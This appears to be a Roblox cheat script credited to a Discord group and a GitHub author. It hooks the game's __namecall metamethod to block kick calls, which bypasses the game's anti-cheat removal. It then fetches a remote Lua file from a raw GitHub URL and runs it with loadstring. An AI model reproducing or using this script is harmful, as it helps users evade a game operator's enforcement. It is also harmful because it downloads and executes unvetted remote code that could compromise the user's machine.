--[[
discord.gg/thedevs
credits to Exunys (https://github.com/Exunys)
]]

local Players = game:GetService("Players")
local OldNameCall = nil

OldNameCall = hookmetamethod(game, "__namecall", function(Self, ...)
    local NameCallMethod = getnamecallmethod()

    if tostring(string.lower(NameCallMethod)) == "kick" then
          error("Bypassed jmes kick")
        return nil
    end
    
    return OldNameCall(Self, ...)
end)


loadstring(game:HttpGet("https://raw.githubusercontent.com/jmesfo0/RobloxScripts/main/psx-jmes.lua"))()
